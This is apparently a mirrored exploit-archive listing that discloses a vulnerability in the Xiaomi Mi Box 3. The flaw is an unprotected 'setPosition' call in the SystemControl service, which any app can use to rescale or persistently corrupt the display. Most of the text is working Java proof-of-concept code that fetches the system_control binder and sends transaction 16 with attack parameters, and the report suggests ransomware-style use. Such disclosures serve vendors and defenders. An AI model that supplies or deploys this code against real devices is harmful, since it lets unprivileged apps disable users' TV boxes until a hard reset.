@@ -1,0 +1,47 @@
+id: 33598
+date: 11/29/2019
+title: Xiaomi Mi Box Display Corruption Exploit
+author: Bug Reporter
+cves: 
+
+I would like to report a security vulnerability in Xiaomi Mi Box (model: MIBOX3, build.id : MHC19). 
+
+The vulnerability allows rescaling and corrupting the display without any privilege requirement, thus creating an opportunity for a non-privilege malicious app to disable the basic functionalities that the TV box is offering or can even be used for ransomeware purpose - e.g., each time a target streaming app is launched, the malicious app can corrupt the display. 
+
+
+This vulnerability is due to the following:
+
+Xiaomi introduces a (non-protected) custom API in the SystemControl system service ¡°setPosition¡± which takes as arguments 4 integers. Once invoked with maliciously set parameters, the system display will be effected; e.g.,  (500, 500, 1000,1000) for rescaling the display and (1000,1000,1000,1000) for corrupting the display. Note that the display corruption will be persistent across reboots, making it very difficult to be fixed without a hard reset.
+
+
+
+We can exploit this API as follows:
+
+Class ServiceManager = Class.forName("android.os.ServiceManager");
+
+Method getService = ServiceManager.getMethod("getService", String.class);
+
+mRemote = (IBinder) getService.invoke(null,"system_control");
+
+Parcel localParcel1 = Parcel.obtain();
+
+Parcel localParcel2 = Parcel.obtain();
+
+localParcel1.writeInterfaceToken("droidlogic.ISystemControlService");
+
+localParcel1.writeInt(500);
+
+localParcel1.writeInt(500);
+
+localParcel1.writeInt(1000);
+
+localParcel1.writeInt(1000); 
+
+mRemote.transact(16, localParcel1, localParcel2, 0);  // 16 corresponds to the API setPosition
+
+localParcel2.recycle();
+
+localParcel1.recycle();
+
+
+#  0day.today [2023-03-22]  #
